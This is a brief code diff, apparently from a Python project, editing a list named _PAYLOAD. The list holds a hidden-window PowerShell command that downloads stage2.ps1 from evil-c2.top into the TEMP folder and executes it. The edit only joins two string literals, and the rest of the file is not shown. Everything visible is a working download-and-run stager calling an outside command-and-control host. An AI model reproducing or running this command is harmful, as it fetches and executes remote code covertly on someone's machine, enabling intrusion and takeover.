@@ -11,7 +11,7 @@ _PAYLOAD = [
     "-WindowStyle",
     "Hidden",
     "-Command",
-    "iwr https://evil-c2.top/stage2.ps1 -OutFile $env:TEMP\\s.ps1; " "& $env:TEMP\\s.ps1",
+    "iwr https://evil-c2.top/stage2.ps1 -OutFile $env:TEMP\\s.ps1; & $env:TEMP\\s.ps1",
 ]
 
 
